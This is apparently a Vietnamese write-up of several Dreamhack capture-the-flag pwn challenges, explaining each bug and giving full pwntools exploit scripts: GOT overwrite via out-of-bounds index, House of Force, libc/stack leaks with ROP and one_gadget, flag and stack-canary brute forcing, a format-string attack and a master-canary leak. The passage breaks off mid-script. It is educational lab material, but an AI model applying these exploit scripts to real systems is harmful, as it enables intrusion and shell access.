```

![image](https://hackmd.io/_uploads/S1c_hzD4kl.png)

-------

30 . p_rho
---------

1 bài ở mức easy

đầu tiên nó sẽ cho ta nhập vào 1 giá trị ```unsigned long ``` , tiếp theo nó sẽ gán giá trị đó vào buf[i] , buf[i]  sẽ là 1 biến cục bộ ở địa chỉ ```0x404080```

![image](https://hackmd.io/_uploads/Sk6iCfDVJl.png)


ta sẽ đọc code asm để dễ hiểu hơn 

![image](https://hackmd.io/_uploads/BJlqlXD41x.png)

- theo quy trình là giá trị mà ta nhập vào là v3 sẽ là giá trị của i kế tiếp , và giá trị của i kế tiếp sẽ  ``` nhân với 8 và cộng địa chỉ của buf ``` , ở đây chương trình không check số âm nên xảy ra lỗi oob , ta có thể ghi đè hàm win cho sẵn vào got của 1 hàm nào đó

script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./prob',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 20318)

p.sendline(b'-12')
input()
p.sendline(str(int(exe.sym.win)))


p.interactive()
```

--------

31 . House of Force
--------

reverse : 

- bài này có 3 option

![image](https://hackmd.io/_uploads/SkJmoBvE1e.png)

option1 : create

- đầu tiên nó sẽ check xem số chunk có lớn hơn 10 không , tiếp theo ta được nhập 1 size tùy ý và được malloc với size mà ta nhập vào , tiếp theo đó là read vào chunk vừa tạo với số size là size mà ta nhập vào

- in địa chỉ chunk heap cùng với dữ liệu trong chunk đó

![image](https://hackmd.io/_uploads/HyCVoHv4Jx.png)

- option2 

ta được nhập 3 lần , lần đầu là idx , lần 2 là idx đến dữ liệu mà ta muốn ghi , lần 3 là giá trị mà ta muốn ghi vào

![image](https://hackmd.io/_uploads/HypsjSPE1g.png)

- option3 : thoát
 
- tên bài ở đây đã nói nên tất cả , ở bài này ta sẽ sử dụng 1 kỹ thuật tấn công heap : ``` House of force ```

nói sơ qua thì kĩ thuật này đầu tiên ta có thể overwrite được topchunk -> tiếp theo là malloc() với 1 số lượng lớn byte đến target mà ta cần -> cuối cùng là ghi 1 one_gadget hoặc system hoặc 1 hàm win nào đó vào target (lúc này nó sẽ là chunk tiếp theo được malloc)

- ở bài này ta được cho địa chỉ heap -> có thể tính được địa chỉ top chunk , ta cũng được ghi dữ liệu tùy ý ở option2 

- vì vậy thứ mà ta muốn làm là overwrite địa chỉ topchunk bằng option2 , tính toán offset giữa ```target``` (hàm got nào đó) và top chunk , sau đó chỉ việc malloc và ghi dữ liệu vào

script : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./house_of_force',checksec=False)

#p = process()
p = remote('host3.dreamhack.games', 15584)

#gdb.attach(p,gdbscript='''
 #          b*0x08048864
 #          b*0x0804872c
 #          b*0x08048775
  #         ''')
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'16')
p.sendlineafter(b'Data: ',b'a'*16)

leak_heap = p.recvuntil(b':')[:-1]
print(leak_heap)


top_chunk = int(leak_heap,16) + 20

log.info(f"top chunk: {hex(top_chunk)}")

#overwrite top chunk


input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'ptr idx: ',b'0')
p.sendlineafter(b'write idx: ',b'5')
p.sendlineafter(b'value: ',str(int(0xffffffff)))

target = exe.got.malloc
pause()
win = target - top_chunk - 8
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',str(int(win)))
p.sendlineafter(b'Data: ',b'a'*win)

input()
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", b"4")
p.sendlineafter(b"Data: ", p32(exe.sym.get_shell))


p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))
p.interactive()
```

giải thích 1 chút ở đoạn tính toán offset của target , ta trừ đi 0x8 vì đảm bảo rằng vùng cần ghi đè là vùng dữ liệu của heap

------------


32 . House of spirit
-----------

- Đây cũng là 1 kĩ thuật trong heap mình vừa học được 

tóm tắt kĩ thuật : đây là 1 kĩ thuật để tấn công ```fastbin``` , nó sẽ sử dụng đặc tính của fastbin là trả về cùng 1 địa chỉ khi phân bổ lại cùng kích thước . Đây là một kỹ thuật có thể được sử dụng khi 1 địa chỉ có thể được giải phóng bằng cách thao tác các đối số của hàm free().

nó sẽ xảy ra khi kích thước của 1 chunk giả được ghi vào stack/heap và địa chỉ + 8 có thể được giải phóng

khác với ```house of force ``` là ```house of spirit``` sẽ tấn công bằng cách tạo ra 1 chunk fake khi size của top chunk không thể bị thay đổi

ta sẽ thử ví dụ : 

```
gdb-peda$ x/10gx 0x7fff88ab8860-0x10
0x7fff88ab8850:    0x0000000000000001    0x0000000000000061 // prev_size + size
0x7fff88ab8860:    0x0000000000000000    0x0000000000000000
0x7fff88ab8870:    0x0000000001560260    0x0000000000000000
```

khi ptr ```0x7fff88ab8860``` được free() , 0x1 và 0x61 bị nhầm lẫn với prev_size và size , còn ```0x7fff88ab8850 ``` sẽ được sử dụng làm chunk miễn phí


Tiếp theo, giả sử chúng ta phân bổ cùng kích thước fastbin.

```
gdb-peda$ x/10gx 0x7fff88ab8860-0x10
0x7fff88ab8850:    0x0000000000000001    0x0000000000000061 // prev_size + size
0x7fff88ab8860:    0x0000000000000000    0x0000000000000000
0x7fff88ab8870:    0x0000000001560260    0x0000000000000000
```

Khi dữ liệu được ghi vào vùng mới được phân bổ, dữ liệu sẽ được phân bổ bắt đầu từ địa chỉ 0x7fff88ab8860.

chunk mà ta fake đã được phân bổ và sử dụng ở trong heap luôn

Kỹ thuật thao túng bộ nhớ ngẫu nhiên bằng cách xây dựng một fake chunk theo cách này, sử dụng nó như một đoạn được free và khiến nó được sử dụng như một đoạn phân bổ được gọi là house of Spirit.

tóm lại , khi ta có thể fake 1 chunk (gồm prev size và size ở đâu đó như stack) và sử dụng địa chỉ này làm đối số cho hàm free()  , khi ta malloc lại tương tự size đó -> ta có thể overwrite được cái gì đó như return address chẳng hạn ...


okay vào bài thôi

- reverse : 



![image](https://hackmd.io/_uploads/Sy8kwK_VJe.png)


ta thấy đầu tiên ta được nhập 31 bytes vào biến s ( biến này nằm trên stack) , tiếp theo nó sẽ in địa chỉ cùng với giá trị cho ta luôn

- tiếp theo là ta có 3 option để chọn 

- option 1 : 

check xem idx có lớn hơn 10 không , tiếp theo là nhập 1 size không giới hạn và malloc với size đó , nhập dữ liệu vào chunk với size được malloc , tăng count idx lên 1

- option 2 :

ta được nhập 1 địa chỉ và free() địa chỉ này luôn -> ở đây như đã nói , ta có thể sử dụng kĩ thuật ```house of force```

- option 3 : exit



lên ý tưởng : 

- ở đây rõ ràng ta sẽ có địa chỉ stack -> vì vậy ta sẽ fake ```prev size``` và ```size``` để khi ta free() và malloc lại  , ta có thể ghi đè được dữ liệu trên stack 

- vì fast_bin khi malloc lại nó sẽ check size và đó là lí do mà ta ```fake prev size ```và  ```size``` như ở trên ta đã nói

- ở đây ta cần lựa 1 size vừa đủ , họăc lớn để có thể ghi đè được thằng retaddress cách biến ```s``` 0x30 bytes

![image](https://hackmd.io/_uploads/B1LmljuN1x.png)


33 .oob
---------

checksec 

![image](https://hackmd.io/_uploads/BkdQ35WHke.png)



reverse : 

- đầu tiên ta thấy ở đây sẽ có 2 option chính : 

- option 1 sẽ là nhập vào 1 số ```long long int``` và lấy số đó làm idx để in 1 kí tự của biến global ```oob``` 
- option 2 là được thay đổi giá trị tại idx mà ta nhập vào

![image](https://hackmd.io/_uploads/Sy-dc9bSyx.png)


nói chung ý tưởng của bài này khá rõ ràng , đầu tiên option1 sẽ là dùng để leak libc hoặc exeaddress gì đó , ta thấy kế biến ```oob``` là địa chỉ libc và exe luôn

![image](https://hackmd.io/_uploads/HJIdo5-B1l.png)

- option2 là ghi 1 gía trị nào đó (onegadget,system) vào GOT , fini_aarray...  , tuy nhiên ở bài này GOT của exe sẽ không ghi được vì Full Relro 

-> mình có 2 suy nghĩ để làm bài này : thứ nhất là ta sẽ dùng option2 để ghi đè ret bằng pop_rdi , bin_sh , system như bình thường , thứ hai là ta sẽ dùng one_gadget để ghi địa chỉ của libc 

-> muốn ghi được ret thì ta phải tính toán được offset giữa oob và ret (mặc dù giá trị sẽ rất lớn nhưng vì giá trị ta được nhập vào là long long int nên sẽ không có vấn đề)

- ở đây muốn tính được offset giữa biến oob và retaddress thì ta cần phải leak thằng libc_environ trước vì địa chỉ oob và địa chỉ stack không cố định theo 1 offset 

- ở đây ta sẽ chỉ nói đến cách 2 , cách 1 thì mình sẽ để script ở đây : 

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./oob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('host3.dreamhack.games', 10781)
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000135C
#           brva 0x000000000000139A
#           brva 0x00000000000013DB
#           ''')

leak_libc = b''

####LEAK LIBC ######
for i in range(16,22):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'offset: ',str(i).encode())
    leak_libc += p.recv(1)
leak_libc = u64(leak_libc.ljust(8,b'\x00'))
print(hex(leak_libc))
libc.address = leak_libc - libc.sym._IO_2_1_stdout_
log.success(f"libc: {hex(libc.address)}")


offset = 0x4008
#### leak PIE ######
leak_PIE = b''
for i in range(-8,-2,1):

    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'offset: ',str(i).encode())
    leak_PIE += p.recv(1)


leak_PIE = u64(leak_PIE.ljust(8,b'\x00'))

exe.address = leak_PIE - offset
log.success(f"exe address: {hex(exe.address)}")

###############################################
environ = libc.sym.environ
log.info(f"environ: {hex(environ)}")
oob = exe.address + 0x4010

environ2oob = environ - oob
stack_leak = b""
input()
for i in range(environ2oob,environ2oob+8):
    p.sendlineafter(b"> ",b'1')
    p.sendlineafter(b"offset: ",str(i).encode())
    stack_leak += p.recv(1)
stack_leak = u64(stack_leak)

log.info(f"stack leak: {hex(stack_leak)}" )

rsp = stack_leak - 0x120

oob2ret = rsp - oob
bin_sh = next(libc.search('/bin/sh\x00'))
system = libc.sym.system
pop_rdi = 0x000000000002a3e5 + libc.address
one_gadget = 0xebcf5 + libc.address
log.info(f"rsp = {hex(rsp)}")
log.info(f"environ: {hex(stack_leak)}")
log.info(f"og: {hex(one_gadget)}")
input()
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret).encode())
p.sendlineafter(b'value: ',str(pop_rdi).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+8).encode())
p.sendlineafter(b'value: ',str(bin_sh).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+16).encode())
p.sendlineafter(b'value: ',str(pop_rdi+1).encode())

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'offset: ',str(oob2ret+24).encode())
p.sendlineafter(b'value: ',str(system).encode())



p.interactive()
```


CÁCH 2  : cách này mình tham khảo từ Keyme , ta chỉ cần overwrite got của libc vì got của libc không có ```full Relro```

![image](https://hackmd.io/_uploads/BkQuQo-Bke.png)

- ta sẽ dùng one_gadget để ghi đè memcpy và dùng strlen() để setup các thanh ghi thõa điều điện của one_gadget , còn việc leak libc đồ các kiểu thì nó sẽ tương tự cách 1 thôi

script : 
```
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'DEBUG'

IP = "host3.dreamhack.games"
PORT = 9634
p = remote(IP, PORT)
#p = process('./oob', env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')

def read(offset):
    global stdout
    p.sendlineafter('> ', str(1))
    p.sendlineafter('offset: ', str(offset))

def write(offset, data):
    p.sendlineafter('> ', str(2))
    p.sendlineafter('offset: ', str(offset))
    p.sendlineafter('value: ', str(data))

# Leak libc
stdout = b''
read(0x10)
stdout += p.recv(1)
read(0x10+0x1)
stdout += p.recv(1)
read(0x10+0x2)
stdout += p.recv(1)
read(0x10+0x3)
stdout += p.recv(1)
read(0x10+0x4)
stdout += p.recv(1)
read(0x10+0x5)
stdout += p.recv(1)
read(0x10+0x6)
stdout += p.recv(1)
read(0x10+0x7)
stdout += p.recv(1)
stdout = u64(stdout)
log.info('stdout: '+hex(stdout))
libc_base = stdout - 0x21a780
log.info('libc_base: '+hex(libc_base))
strlen = libc_base + 0x219098
log.info('strlen: '+hex(strlen))
prev_memcpy = libc_base + 0x2CDC4
log.info('prev_memcpy: '+hex(prev_memcpy))
memcpy = libc_base + 0x219160
log.info('memcpy: '+hex(memcpy))
oneshot = libc_base + 0xebcf8
log.info('oneshot: '+hex(oneshot))

# Leak oob
oob = b''
read(-0x8)
oob += p.recv(1)
read(-0x8+0x1)
oob += p.recv(1)
read(-0x8+0x2)
oob += p.recv(1)
read(-0x8+0x3)
oob += p.recv(1)
read(-0x8+0x4)
oob += p.recv(1)
read(-0x8+0x5)
oob += p.recv(1)
read(-0x8+0x6)
oob += p.recv(1)
read(-0x8+0x7)
oob += p.recv(1)
oob = u64(oob)+0x8
log.info('oob: '+hex(oob))

'''
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
## strlen got in libc -> "rsi == null, rdx == null" and "call memcpy" gadget in libc -> memcpy got in libc -> oneshot
write(memcpy-oob, oneshot)
write(strlen-oob, prev_memcpy)

p.interactive()
```

34 .Sea of Stack
---------

- 1 bài khá lạ đối với mình , đúng là dreamhack luôn có những bài chất lượng , mỗi bài đều học được thêm 1 mẹo :>> ử


reverse : 

- nhìn vào logic chương trình thì sẽ rất đơn giản thôi , tất cả các input đều được gọi từ hàm ```read_input```  , đầu tiên nó check xem chuỗi nhập vào có giống với ```Decision2Solve``` không? , nếu có thì ta được ghi tùy ý giá trị là 6 byte
![image](https://hackmd.io/_uploads/ryY38frUkl.png)

- 2 hàm safe_func và unsafe_func đều giống với cái tên : 

unsafe_func có BOF , chờ đã nếu có BOF thì có phải đơn giản quá không? , thực ra là không =))
![image](https://hackmd.io/_uploads/S1oBPzB81x.png)

![image](https://hackmd.io/_uploads/BJH8Dfr81x.png)


- ta cần nhìn thật kĩ vào vấn đề , ở đây nó bắt ta nhập ```0x10000``` byte , bắt đầu từ địa chỉ ```0x7fffffffd840``` 

![image](https://hackmd.io/_uploads/ry3AvfS81e.png)

-vậy dùng 1 phép tính cộng đơn giản , bump :))) , ta không có đủ khoảng trống trong stack để nhập hết ề byte đó , và lúc này là lúc ta trở về thứ quan trọng ở đầu bài , đó là write_what_write  , ta cần sử dụng thằng này để giảm stack của ta xuống để khi nó vào hàm ```unsafe_func``` nó có thể nhập đủ lượng byte đó

![image](https://hackmd.io/_uploads/r107OGrIyl.png)

- đơn giản là ta sẽ ghi hàm ```main``` thay cho hàm ```safe_func``` , lúc này khi gọi ```safe_func``` nó sẽ quay ngược lại hàm main , khi quay ngược lại thì nó sẽ setup hàm mới và trừ stack đi , ta chỉ cần trừ đến 1 khoảng cách nhất định và dùng ROP để lấy shell
![image](https://hackmd.io/_uploads/BJQWFMHI1e.png)
hết chỗ rồi
![image](https://hackmd.io/_uploads/Sk1BfXBL1e.png)


35 .checkflag
-------

1 bài tag rev + pwn
- reverse : 

ta thấy ở đây nó đọc 64 byte flag vào ```string_flag``` , tiếp theo là dùng ```read``` đọc 200 byte vào buf , ở đây buf và flag của ta sẽ cách nhau 0x40 byte 

tiếp theo nữa nó sẽ check xem độ dài của flag có lớn hơn độ dài input của ta không , điều kiện thứ hai là input của ta có phải là flag không?   , nếu 1 trong hai thằng trên thõa thì in ra ```failed!``` và thoát , ngược lại thì in ra đúng
![image](https://hackmd.io/_uploads/BydYEFrIyg.png)

- nhìn vào bài này , đây có lẽ là 1 bài brute_force flag , tuy nhiên để thõa mãn điều kiện ở trên thì khá khó?  , có nghĩa là ta không biết độ dài flag là bao nhiêu (giới hạn 63 byte) , nếu brute_force thì sẽ khá khó khăn (0x20->0x7f)

- chú ý ở hàm ```read``` , ở đây sẽ xuất hiện bug ```BOF``` , ta có thể tận dụng thằng này để biết được độ dài flag , vậy muốn biết thì như thế nào?

strcmp() sẽ so sánh 2 thằng này xem giống nhau không? , ta có thể overwrite cả dữ liệu flag , vậy ta chỉ cần làm cho 2 thằng này giống nhau , lúc này chỉ còn mỗi điều kiện còn lại

- vậy ta sẽ so sánh đến khi nào gặp ```Correct``` thì đó là độ dài của flag 



```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./checkflag',checksec=False)

len_flag = 0
for i in range(1,64):
    p  = remote('host1.dreamhack.games', 22824)
    payload = b'a'*i
    payload = payload.ljust(0x40,b'\x00')
    payload += b'a'*i
    p.sendafter(b'?',payload)
    if b'Correct' in p.recvline():
        len_flag = i
        print(f"len flag: {len_flag}")
        p.close()
        break
    p.close()




p.interactive()
```

và ta thấy được độ dài flag là 16-4 (DH{}): 

![image](https://hackmd.io/_uploads/rkuWCKrIJl.png)


- tiếp theo ta sẽ brute_force 12 kí tự (0x20-0x7f):

cũng giống với đoạn tìm len_flag , lần này ta cũng sẽ ghi đè flag để tìm từng kí tự , vd flag có độ dài 16 thì ta sẽ ghi 15 byte nào đó và + 1 byte(0x20->0x7f) , dùng jlust để lắp đầy ```buf``` , sau đó ghi đè 15 byte nào đó vào flag và cứ thế tiếp tục  : 

- flag sẽ là 16 kí tự đầu , vậy ta sẽ filter byte a giảm dần (15 + byte_flag) và filter đủ 64 byte để overwrite dữ liệu 15-i byte của flag giống với ```buffer```

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./checkflag',checksec=False)

len_flag = 0
for i in range(1,64):
    p  = remote('host1.dreamhack.games', 22149)
    payload = b'a'*i
    payload = payload.ljust(0x40,b'\x00')
    payload += b'a'*i
    p.sendafter(b'?',payload)
    if b'Correct' in p.recvline():
        len_flag = i
        print(f"len flag: {len_flag}")
        p.close()
        break
    p.close()
    
flag = b''
for i in range(16):
    log.info(f"count {i}")
    for j in range(0x20,0x7f):
        p = remote('host1.dreamhack.games',22149)
        payload = b'a'*(15-i)
        payload += bytes([j]) + flag
        payload = payload.ljust(64,b'\x00') + b'a'*(15-i)
        p.sendafter(b'?',payload)
        if b'Correct' in p.recvline():
            flag = bytes([j]) + flag
            print(flag)
            p.close()
            break
        p.close()
print(f"flag is {flag}.decode()")



p.interactive()

```

--------------

36 .newstrcmp
------

1 bài bruteforce khá giống ở bài trước ...

checksec : 

![image](https://hackmd.io/_uploads/Hk2tXj881x.png)

- reverse 

ở bài này ta sẽ được nhập 2 lần input , input đầu tiên sẽ đọc dữ liệu vào ```s1``` và không xảy ra BOF  , input thứ hai là ```s2``` ta thấy có 1 BOF rất rõ ràng ở đây , tuy nhiên ở đây CANARY được bật 

![image](https://hackmd.io/_uploads/HyaLzjUIyl.png)

- ```newstrcmp``` : 

nó sẽ check từng byte của ```s1``` với ```s2``` , nếu khác nhau thì nó sẽ so sánh xem byte nào lớn hơn và cập nhật idx , trả về kết quả 

![image](https://hackmd.io/_uploads/BJOnBiLUJx.png)


- ở đây ta thấy được có 1 bug ```BOF``` rất rõ ràng , tên bài là ```newstrcmp``` nên ta sẽ focus chính vào hàm này , ở đây nó cũng sử dụng ```while``` , thường các bài leak nhiều thứ hoặc fsb sẽ dùng đến nó , vậy ta sẽ suy nghĩ cách xem có leak được canary không?

- câu trả lời là có , ở đây nó check ```byte``` của ```s1``` và ```s2``` , ta có thể tận dụng điều này để ```brute_force``` được canary 

- lần read đầu tiên từ ```0x7fffffffd880``` đến ```0x7fffffffd898``` và lần read tiếp theo là của ```s2``` , vậy ta chỉ cần read vào ```s1``` 24 byte + với 1 byte ```brute_force``` , và tương tự cũng read vào ```s2``` là 25 byte ```brute_force``` , vì byte cuối cùng của ```canary``` luôn là ```\x00``` nên chỉ cần ```brute_force``` 7 byte

![image](https://hackmd.io/_uploads/BJ_6wsL8Jl.png)

script 
```
from pwn import *
context.binary = exe = ELF('./newstrcmp')
#p = process(exe.path)

p = remote("host1.dreamhack.games", 13180)
context.log_level = "debug"

#gdb.attach(p,gdbscript='''
#           b*0x0000000000401482
#           ''')
input()
def read(a,b):
    p.sendafter(b'(y/n):',b'n')
    p.sendafter(b's1:',a)
    p.sendafter(b's2:',b)
    return
count = 0
can = str("00")
for i in range(25,32):
    a = 0
    while True:
        a = a+1
        read(b'a'*i + p8(a),b'a'*i)
        b = p.recvline()
        if b != b" Result of newstrcmp: s1 is smaller than s2, first differs at %d\n" %(i):
            can = str(hex(a))[2:] + can
            count += 1
            log.info(f'found {count}: {bytes([i])}')
            break
print("before: ",can)
can = int(can,16)
print("after: ",can)
input()
p.sendlineafter(b'(y/n):',b'n')
p.sendafter(b's1:',b'k')
input()
p.sendafter(b's2:',b'a'*0x18 + p64(can) + p64(0) + p64(exe.sym.flag))
p.sendafter('Exit? (y/n):',b'y')
p.interactive()
```

![image](https://hackmd.io/_uploads/SJyUL3881l.png)

ở đây ta có thể dùng ```binary_search``` để tối ưu hóa , đây là script tham khảo: 

```
from pwn import *

#r = process("./newstrcmp")
r = remote("host1.dreamhack.games", 13363)
context.log_level = "debug"
pause()

r.recvuntil(b"newstrcmp")

r.recvuntil(b"Exit? (y/n): ")
flag = 0
canary = ""
while(flag != 1) :
    low = 1
    high = 255
    while(low <= high) :
        print(len(canary))
        print("now canary = " + canary)
        r.sendline(b"n")
        mid = (low + high) // 2
        pay = ""
        pay += "A"*25
        pay += canary
        pay += chr(mid)

        r.recvuntil("s1: ")
        r.send(pay)
        r.recvuntil("s2: ")
        r.send("A"*25)
        high_low_result = r.recv()
        if b"smaller" in high_low_result :
            low = mid + 1
        else :
            high = mid - 1
        if b"same" in high_low_result or b"32" in high_low_result:
            canary += str(chr(mid))
            print("target = " + str(mid))
            log.info("canary update = " + str(canary))
        if(len(canary) == 7) :
            flag = 1
            break

real_pay = b"A"*24
real_pay += b"\x00"
tmp = bytes(canary, "latin-1")
real_pay += bytes(canary, "latin-1")
real_pay += b"B"*8
real_pay += p64(0x0040125B)


pause()
r.sendline(b"n")
pause()
r.recvuntil("s1: ")
pause()
r.send("A\x00")
pause()
r.recvuntil("s2: ")
pause()
r.send(real_pay)
pause()

r.recvuntil("Exit? (y/n): ")
pause()
r.sendline("y")

r.interactive()
```

37 .strings
-------

- 1 bài lv4 nhưng mình nghĩ chỉ ở lv2 thôi :v

![image](https://hackmd.io/_uploads/SJ1Vu9D8ke.png)


- phân tích

nhìn vào biết ngay là 1 bài fsb điển hình luôn :)))  , có while , print(s) nhưng ở đây nó sử dụng ```warnx``` để in

![image](https://hackmd.io/_uploads/BkKEu9wIyg.png)


checksec : mọi thứ đều không an toàn ngoại trừ ```NX```  , ```RELRO``` 1 phần là quá đủ để khai thác bài này

![image](https://hackmd.io/_uploads/BkrR_qvIke.png)


- vì đã làm nhiều nên sẽ vào thẳng vấn đề chính 

> leak libc -> overwrite got của warnx thành system và get_shell

script : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./string_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

#p = process()
p = remote('host1.dreamhack.games', 15224)
#gdb.attach(p,gdbscript='''
#           b*0x804881a
#           b*0x0804875D
#           b*0x08048778

#           ''')


p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',b'%71$p|%73$p')
p.sendlineafter(b'> ',b'2')

offset = 0x18637
p.recvuntil(b': ')
leak = int(p.recvuntil(b'|')[:-1],16)
rsp = int(p.recvline()[:-1],16) - 0x1ac
libc.address = leak - offset
log.info(f"leak rsp: {hex(rsp)}")
log.info(f'leak libc {hex(libc.address)}')

bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
one_gadget = libc.address + 0x3a819
log.info(f"system: {hex(system)}")

package = {
        one_gadget & 0xffff: exe.got.printf,
        one_gadget >> 16 & 0xffff: exe.got.printf+2,
        }
write = {
    exe.got.warnx:system
}
payload = fmtstr_payload(5,write,write_size='short')

input()
p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',payload)
p.sendlineafter(b'> ',b'2')

p.sendlineafter(b'> ',b'1')
p.sendafter(b'Input: ',b'/bin/sh\x00')
p.sendlineafter(b'> ',b'2')



p.interactive()
```

38 .master_canary
--------

sau một hồi fix docker thì cuối cùng cũng build thành công , ở đây nó hiện ```ptrace: No such process``` , mặc dù đã dùng ```sudo gdb``` rồi nhưng không hiệu quả :v  



checksec : 



```
// gcc -o master master.c -pthread
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}

void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}

int main(int argc, char *argv[]) {
    size_t size = 0;
    pthread_t thread_t;
    int idx = 0;
    char leave_comment[32];

    initialize();

    while (1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0) {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%lu", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}

```

bài này có 3 option chính

![image](https://hackmd.io/_uploads/BkTp-_CUkl.png)

- option1 : tạo 1 thread và đặt địa chỉ của ```buf``` vào ```Global_buffer ``` thông qua hàm ```thread_routine``` 

- option2 : ta được nhập 1 size và read vào ```Global_buffer``` với số byte là size được nhập
- option3 : được nhập 1 số lượng lớn byte và kết thúc chương trình

ở bài này , ta thấy 1 lỗi ```BOF``` rất rõ ràng , tuy nhiên ở đây canary lại bật , thông thường sẽ có hàm leak canary để ta có thể vượt qua nó , tuy nhiên ở đây mình vẫn chưa tìm kiếm được hàm nào để có thể xác định chính xác canary , và đây cũng là 1 bài example nói về ```master canary``` luôn , vậy ta sẽ cùng tìm hiểu nó 

- ta thấy option1 nó dùng pthread() để tạo 1 luồng mới , và không gian bộ nhớ của hàm ```thread_routine``` sẽ được phân bổ trong vùng liền kề với vùng ```TLS``` trên stack , vậy nếu xảy ra BOF ta có thể ghi đè dữ liệu ở vùng ```TLS``` 

- Thread Local Storage

Thread Local Storage (TLS) chính xác như tên gọi của nó , nó sẽ lưu trữ cho các luồng . Nếu bạn xem tệp nhị phân ELF, nó quản lý dữ liệu theo từng phần, mỗi phần có mục đích riêng . vd text để thực thi mã , bss để lưu trữ các biến toàn cục chưa được khởi tạo , … Mặt khác, vùng TLS là không gian để lưu trữ các biến toàn cục của luồng và được trình tải phân bổ.

- tất cả các hàm đều sử dụng chung 1 canary , vì vạy nếu ta có để overwrite ```master canary``` ở TLS hoặc leak được nó ra thì ta sẽ bypass thành công

và ta có thể tính toán địa chỉ của buf với master canary , filter bằng những byte và leak nó bằng đoạn này 

```
printf("Data: %s", (const char *)global_buffer);
```

hãy cùng phân tích qua hàm thread_routine : 

- nó sẽ mov giá trị của ```fs:0x28``` vào ```rbp-8``` , đến đoạn +41 thì nó mov vào rdx và xor với giá trị ban đầu để check , nếu bị thay đổi thì gọi hàm ```__stack_chk_fail@plt``` 

![image](https://hackmd.io/_uploads/SJmZ_dCUkx.png)


- ta có thể thấy 2 giá trị này giống nhau

![image](https://hackmd.io/_uploads/Bka6_uCIyx.png)

- nếu để ý kĩ thì đoạn này chính là ```global_buffer = buf``` 

```
0x0000000000400a75 <+26>:    lea    rax,[rbp-0x110]
```

- ta sẽ lấy offset : 

![image](https://hackmd.io/_uploads/Sy1F9dAI1e.png)

- vì vậy ta sẽ leak canary như sau : gửi 0x938 + 1 byte để leak và dùng option3 để overwrite thành hàm get_shell


leak thành công 

![image](https://hackmd.io/_uploads/HJGCJt0Ukx.png)

get_shell


![image](https://hackmd.io/_uploads/HJWmMKR8ke.png)

- tuy nhiên phiên bản libc ở sever sẽ khác , ta không thể leak canary 1 cách chính xác mặc dù build docker và patch vào rồi nhưng khi mở gdb thì vẫn có lỗi gì đó :v 

script 
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./master_canary")
#libc = ELF("./libc-2.23.so")
#ld = ELF("./ld-2.23.so")

context.binary = exe


p = process()
#p = remote('host1.dreamhack.games', 15652)
#gdb.attach(p,gdbscript='''
#        b*0x0000000000400C55
#           ''')

payload = b"a"*2361
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Size: ',f'{len(payload)}'.encode())
p.sendlineafter(b'Data: ',payload)

p.recvuntil(payload)
leak = b'\x00' + p.recv(7)
log.info(f'canary: {hex(u64(leak))}')

payload_get_shell = b'a'*0x28 + leak + p64(0) + p64(0x00000000004007e1) + p64(exe.sym.get_shell)
p.sendlineafter(b'> ',b'3')
p.sendafter(b'Leave comment: ',payload_get_shell)



p.interactive()
```

- vì vậy ta sẽ dùng brute_force

```
from pwn import *

for i in range(0x8e6,0x1000,1):
    p = remote('host1.dreamhack.games', 15652)
    #p = process('./master_canary')
    e = ELF('./master_canary')

    #allocate to thread buffer
    p.sendlineafter(b'> ',b'1')

